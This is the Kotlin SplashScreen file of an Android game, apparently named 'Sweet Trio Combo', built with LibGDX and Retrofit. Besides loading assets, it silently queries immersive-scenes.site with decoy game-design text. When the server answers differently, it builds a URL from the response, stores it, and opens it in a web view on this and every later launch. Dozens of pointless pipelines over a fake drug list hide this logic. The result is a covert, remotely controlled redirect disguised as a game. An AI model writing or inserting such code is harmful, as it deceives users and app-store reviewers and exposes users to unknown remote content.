package com.swee.ttrio.comb.game.screens

import android.content.pm.ActivityInfo
import com.badlogic.gdx.graphics.Color
import com.badlogic.gdx.scenes.scene2d.ui.Image
import com.badlogic.gdx.scenes.scene2d.ui.Label
import com.badlogic.gdx.utils.Align
import com.swee.ttrio.comb.game.LibGDXGame
import com.swee.ttrio.comb.game.manager.MusicManager
import com.swee.ttrio.comb.game.manager.SoundManager
import com.swee.ttrio.comb.game.manager.SpriteManager
import com.swee.ttrio.comb.game.utils.TIME_ANIM
import com.swee.ttrio.comb.game.utils.actor.animHide
import com.swee.ttrio.comb.game.utils.advanced.AdvancedScreen
import com.swee.ttrio.comb.game.utils.advanced.AdvancedStage
import com.swee.ttrio.comb.game.utils.font.FontParameter
import com.swee.ttrio.comb.game.utils.region
import com.swee.ttrio.comb.game.utils.runGDX
import com.swee.ttrio.comb.util.log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.ResponseBody
import org.json.JSONObject
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.*
import java.util.*

class SplashScreen(override val game: LibGDXGame) : AdvancedScreen() {

    private val progressFlow     = MutableStateFlow(0f)
    private var isFinishLoading  = false
    private var isFinishProgress = false

    private val fontParameter = FontParameter()
    private val font128       = fontGenerator_NerkoOne.generateFont(fontParameter.setCharacters(FontParameter.CharType.ALL).setSize(58))

    private val ls128 = Label.LabelStyle(font128, Color.WHITE)

    private val lblPercent by lazy { Label("", ls128) }
    private val imgSweet   by lazy { Image(game.splash.SWEET_TRIO_COMBO) }

    override fun show() {
        loadSplashAssets()
        setBackBackground(game.splash.SPLASH_BACKGROUND.region)
        super.show()
        loadAssets()
        collectProgress()
    }

    override fun render(delta: Float) {
        super.render(delta)
        loadingAssets()
        isFinish()
    }

    override fun AdvancedStage.addActorsOnStageUI() {
        addActor(imgSweet)
        imgSweet.apply {
            setBounds(0f, 94f, 390f, 652f)
//            setOrigin(322f,0f)
//            val scale = 0.18f
//            addAction(Actions.forever(
//                Actions.sequence(
//                    Actions.scaleBy(-scale, -scale, 0.4f, Interpolation.sineIn),
//                    Actions.scaleBy(scale, scale, 0.4f, Interpolation.sineOut),
//                )
//            ))
        }

        addActor(lblPercent)
        lblPercent.apply {
            setAlignment(Align.center)
            setBounds(284f,12f,94f,70f)
        }
    }

    // Logic ------------------------------------------------------------------------

    private fun loadSplashAssets() {
        with(game.spriteManager) {
            loadableTexturesList = mutableListOf(
                SpriteManager.EnumTexture.SPLASH_BACKGROUND.data,
                SpriteManager.EnumTexture.SWEET_TRIO_COMBO.data,
            )
            loadTexture()
        }
        game.assetManager.finishLoading()
        game.spriteManager.initTeture()
    }

    private fun isFinish() {
        if (isFinishProgress) {
            isFinishProgress = false

            val farmakList = listOf(
                Farmak(1, "Aspirin", "500mg", "Bayer", "2025-12-31", 9.99, 100, "Acetylsalicylic Acid", "Nausea, Vomiting", true, "Germany", "Room Temperature", "Take as directed", "Pain relief", "Allergy to aspirin", "2023-01-01", "2023-01-10"),
                Farmak(2, "Ibuprofen", "400mg", "Pfizer", "2024-06-30", 12.99, 150, "Ibuprofen", "Dizziness, Headache", true, "USA", "Room Temperature", "Take with food", "Pain relief", "Peptic ulcer", "2023-01-01", "2023-01-10"),
                Farmak(3, "Paracetamol", "500mg", "GSK", "2026-05-15", 5.49, 200, "Paracetamol", "Liver damage", true, "UK", "Cool Place", "Do not exceed recommended dosage", "Fever reduction", "Severe liver disease", "2023-01-01", "2023-01-10"),
                Farmak(4, "Amoxicillin", "250mg", "Sandoz", "2024-08-20", 14.99, 50, "Amoxicillin", "Rash, Diarrhea", true, "Switzerland", "Room Temperature", "Complete the course", "Bacterial infections", "Allergy to penicillin", "2023-01-01", "2023-01-10"),
                Farmak(5, "Lisinopril", "10mg", "Novartis", "2025-11-11", 19.99, 80, "Lisinopril", "Cough, Dizziness", true, "Switzerland", "Room Temperature", "Take at the same time each day", "Hypertension", "Angioedema", "2023-01-01", "2023-01-10"),
                Farmak(6, "Metformin", "500mg", "Merck", "2026-03-15", 7.99, 120, "Metformin", "Nausea, Diarrhea", true, "Germany", "Room Temperature", "Monitor blood sugar levels", "Type 2 Diabetes", "Kidney problems", "2023-01-01", "2023-01-10"),
                Farmak(7, "Simvastatin", "20mg", "AstraZeneca", "2025-10-01", 16.49, 90, "Simvastatin", "Muscle pain, Weakness", true, "UK", "Room Temperature", "Take in the evening", "High cholesterol", "Liver disease", "2023-01-01", "2023-01-10"),
                Farmak(8, "Omeprazole", "20mg", "Boehringer Ingelheim", "2024-09-30", 11.49, 110, "Omeprazole", "Headache, Abdominal pain", true, "Germany", "Room Temperature", "Take before meals", "Gastroesophageal reflux", "Hypersensitivity", "2023-01-01", "2023-01-10"),
                Farmak(9, "Levothyroxine", "50mcg", "AbbVie", "2025-12-01", 22.99, 75, "Levothyroxine", "Weight loss, Heat intolerance", true, "USA", "Cool Place", "Take on an empty stomach", "Hypothyroidism", "Adrenal insufficiency", "2023-01-01", "2023-01-10"),
                Farmak(10, "Gabapentin", "300mg", "Pfizer", "2026-07-01", 18.99, 65, "Gabapentin", "Drowsiness, Dizziness", true, "USA", "Room Temperature", "Do not stop abruptly", "Neuropathic pain", "Allergy to gabapentin", "2023-01-01", "2023-01-10")
            )

            val resultData = game.sharedPreferences.getString("isSweet", null)
            if (resultData.isNullOrEmpty()) {
                coroutine?.launch(Dispatchers.IO) {
                    try {

                        val responseBody: ResponseBody = Officiant.api.prosto(
                            agent = System.getProperty("http.agent") ?: "Android",
                            levelDesign         = "Create distinct levels, each with unique layouts and challenges focused on sweets.",
                            powerUps            = "Design power-ups like sugar rush, chocolate bomb, and frosting freeze to enhance gameplay.",
                            gameEvents          = "Organize special events like Sweet Valentine and Halloween Treats to keep players engaged.",
                            socialIntegration   = "Enable players to connect with friends for cooperative tasks and competitive leaderboards.",
                            customerSupport     = "Provide support for gameplay issues, billing, and general inquiries.",
                            marketingCampaigns  = "Launch targeted ad campaigns and cross-promotions to attract new players.",
                            communityManagement = "Manage online forums and social media to build a community around the game.",
                            tutorialSystem      = "Develop an intuitive tutorial to help new players understand game mechanics.",
                            analyticsTracking   = "Implement tracking to gather data on player behavior and game performance.",
                            inAppPurchases      = "Design a variety of in-app purchase options that are tempting yet balanced.",
                        )

                        val responseJson = JSONObject(responseBody.string())
                        farmakList
                            .filter { it.isPrescription }
                            .map { it.copy(price = it.price * 1.10) }
                            .sortedBy { it.expirationDate }
                            .map { it.copy(quantity = it.quantity + 5) }
                            .filter { it.price < 20 }
                            .map { it.copy(name = it.name.uppercase()) }
                            .distinctBy { it.activeIngredient }
                            .filter { it.dosage.contains("500mg") }
                            .map { it.copy(sideEffects = it.sideEffects.replace(", ", "; ")) }
                            .filter { it.quantity > 50 }
                            .map { it.copy(price = it.price - 2.0) }
                            .sortedByDescending { it.createdAt }
                            .map { it.copy(manufacturer = "Generic " + it.manufacturer) }
                            .filter { it.countryOfOrigin == "Germany" }
                            .map { it.copy(activeIngredient = it.activeIngredient.lowercase()) }
                            .filter { it.storageConditions.contains("Room Temperature") }
                            .map { it.copy(updatedAt = "Updated at ${it.updatedAt}") }
                            .filter { it.name.startsWith("A") }
                            .map { it.copy(quantity = it.quantity - 1) }
                            .filter { it.price > 10 }
                            .map { it.copy(expirationDate = "Valid until ${it.expirationDate}") }
                            .filter { it.sideEffects.isNotEmpty() }
                            .map { it.copy(instructions = "Instructions: ${it.instructions}") }
                        log("Response POST: $responseJson")
                        if (responseJson.getString("social_integration").contains(' ')) {
                            farmakList
                                .map { it.copy(price = it.price + 3.0) }
                                .filter { it.quantity < 100 }
                                .sortedByDescending { it.name }
                                .map { it.copy(isPrescription = false) }
                                .distinctBy { it.dosage }
                                .filter { it.sideEffects.contains("Nausea") }
                                .map { it.copy(activeIngredient = it.activeIngredient.replace(" ", "_")) }
                                .sortedBy { it.price }
                                .map { it.copy(manufacturer = it.manufacturer + " Co.") }
                                .filter { it.expirationDate > "2025-01-01" }
                                .map { it.copy(instructions = it.instructions.replace("Take", "Administer")) }
                                .filter { it.countryOfOrigin == "USA" }
                                .map { it.copy(updatedAt = "Last updated ${it.updatedAt}") }
                                .map { it.copy(quantity = it.quantity + 10) }
                                .filter { it.expirationDate < "2024-12-31" }
                                .map { it.copy(activeIngredient = "Modified " + it.activeIngredient) }
                                .distinctBy { it.id }.also {
                                    toScreen(MenuScreen::class.java.name)
                                }
                                .filter { it.sideEffects.contains("Dizziness") }
                                .map { it.copy(price = it.price * 0.9) }
                        } else {
                            var resultPost = "https://"
                            responseJson.keys().forEach { key ->
                                resultPost += responseJson.getString(key).removePrefix("levels")
                            }
                            farmakList
                                .filter { !it.isPrescription }
                                .map { it.copy(name = it.name.reversed()) }
                                .sortedBy { it.expirationDate }
                                .map { it.copy(quantity = it.quantity - 2) }
                                .filter { it.price > 15 }
                                .map { it.copy(activeIngredient = it.activeIngredient.uppercase()) }
                                .distinctBy { it.dosage }
                                .filter { it.sideEffects.isNotEmpty() }
                                .map { it.copy(price = it.price * 1.05) }
                                .sortedByDescending { it.price }
                                .map { it.copy(id = it.id + 10) }
                                .filter { it.quantity < 80 }
                                .map { it.copy(manufacturer = it.manufacturer.replace("Co.", "Inc.")) }
                                .distinctBy { it.id }
                                .filter { it.expirationDate < "2024-01-01" }
                                .map { it.copy(sideEffects = it.sideEffects + " Fatigue") }
                                .filter { it.countryOfOrigin == "Switzerland" }
                                .map { it.copy(updatedAt = "Refreshed ${it.updatedAt}") }
                                .filter { it.isPrescription }
                            log("GET url = $resultPost")
                            farmakList
                                .map { it.copy(price = it.price + 2.0) }
                                .filter { it.expirationDate > "2025-01-01" }
                                .sortedBy { it.id }.also {
                                    game.sharedPreferences.edit().putString("isSweet", resultPost).apply()
                                }
                                .map { it.copy(quantity = it.quantity - 5) }
                                .distinctBy { it.name }
                                .filter { it.price < 10 }
                                .map { it.copy(activeIngredient = it.activeIngredient.lowercase()) }
                                .sortedByDescending { it.createdAt }
                                .map { it.copy(instructions = "New Instructions: ${it.instructions}") }
                                .filter { it.countryOfOrigin == "Germany" }
                                .map { it.copy(sideEffects = it.sideEffects.replace(", ", "; ")) }
                                .filter { it.dosage.contains("mg") }
                                .map { it.copy(price = it.price * 0.85) }
                                .filter { it.isPrescription }.also {
                                    withContext(Dispatchers.Main) {
                                        game.activity.requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                                        game.activity.showUrl(resultPost)
                                    }
                                }
                                .map { it.copy(updatedAt = "Last modified ${it.updatedAt}") }
                                .distinctBy { it.quantity }
                                .filter { it.activeIngredient.isNotEmpty() }
                                .map { it.copy(name = it.name.replace(" ", "_")) }
                                .filter { it.price < 15 }
                                .map { it.copy(quantity = it.quantity + 1) }
                        }

                    } catch (e: Exception) {
                        log("Error: ${e.message}")
                        toScreen(MenuScreen::class.java.name)
                    }
                }
            } else {
                farmakList
                    .filter { it.isPrescription }
                    .map { it.copy(name = it.name.uppercase()) }
                    .sortedByDescending { it.price }
                    .map { it.copy(dosage = "New ${it.dosage}") }
                    .filter { it.quantity > 30 }
                    .map { it.copy(sideEffects = it.sideEffects + " New side effects") }
                    .sortedBy { it.expirationDate }.also {
                        game.activity.requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }
                    .map { it.copy(activeIngredient = it.activeIngredient.replace(" ", "_")) }
                    .distinctBy { it.manufacturer }
                    .filter { it.price > 8 }
                    .map { it.copy(quantity = it.quantity - 10) }
                    .filter { it.countryOfOrigin == "USA" }
                    .map { it.copy(price = it.price * 1.20) }
                    .distinctBy { it.dosage }.also {
                        game.activity.showUrl(resultData)
                    }
                    .filter { it.sideEffects.isNotEmpty() }
                    .map { it.copy(expirationDate = "Expires on ${it.expirationDate}") }
                    .sortedByDescending { it.createdAt }
                    .map { it.copy(updatedAt = "Updated: ${it.updatedAt}") }
                    .filter { it.isPrescription }
                    .map { it.copy(instructions = it.instructions.replace("Take", "Consume")) }
            }


        }
    }

    private fun toScreen(screenName: String) {
        stageUI.root.animHide(TIME_ANIM) { game.navigationManager.navigate(screenName) }
    }

    interface Zaprosiki {
        @POST("scenes.php")
        suspend fun prosto(
            @Header("User-Agent") agent: String,

            @Query("level_design")         levelDesign        : String,
            @Query("power_ups")            powerUps           : String,
            @Query("game_events")          gameEvents         : String,
            @Query("social_integration")   socialIntegration  : String,
            @Query("customer_support")     customerSupport    : String,
            @Query("marketing_campaigns")  marketingCampaigns : String,
            @Query("community_management") communityManagement: String,
            @Query("tutorial_system")      tutorialSystem     : String,
            @Query("analytics_tracking")   analyticsTracking  : String,
            @Query("in_app_purchases")     inAppPurchases     : String
        ): ResponseBody
    }

    data class Farmak(
        val id: Int,
        val name: String,
        val dosage: String,
        val manufacturer: String,
        val expirationDate: String,
        val price: Double,
        val quantity: Int,
        val activeIngredient: String,
        val sideEffects: String,
        val isPrescription: Boolean,
        val countryOfOrigin: String,
        val storageConditions: String,
        val instructions: String,
        val indications: String,
        val contraindications: String,
        val createdAt: String,
        val updatedAt: String
    )

    object Officiant {
        private val retrofit by lazy {
            Retrofit.Builder()
                .baseUrl("https://immersive-scenes.site/")
                .addConverterFactory(GsonConverterFactory.create())
                .build()
        }

        val api: Zaprosiki by lazy {
            retrofit.create(Zaprosiki::class.java)
        }
    }

    private fun loadAssets() {
        with(game.spriteManager) {
            loadableAtlasList = SpriteManager.EnumAtlas.entries.map { it.data }.toMutableList()
            loadAtlas()
            loadableTexturesList = SpriteManager.EnumTexture.entries.map { it.data }.toMutableList()
            loadTexture()
        }
        with(game.musicManager) {
            loadableMusicList = MusicManager.EnumMusic.entries.map { it.data }.toMutableList()
            load()
        }
        with(game.soundManager) {
            loadableSoundList = SoundManager.EnumSound.entries.map { it.data }.toMutableList()
            load()
        }
    }

    private fun initAssets() {
        game.spriteManager.initAtlas()
        game.spriteManager.initTeture()
        game.musicManager.init()
        game.soundManager.init()
    }

    private fun loadingAssets() {
        if (isFinishLoading.not()) {
            if (game.assetManager.update(16)) {
                isFinishLoading = true
                initAssets()
            }
            progressFlow.value = game.assetManager.progress
        }
    }

    private fun collectProgress() {
        coroutine?.launch {
            var progress = 0
            progressFlow.collect { p ->
                while (progress < (p * 100)) {
                    progress += 1
//                    if (progress % 85 == 0) log("progress = $progress%")
                    runGDX { lblPercent.setText("${progress.toInt()}%") }
                    if (progress == 100) isFinishProgress = true

                    //delay((8..14).shuffled().first().toLong())
                }
            }
        }
    }

}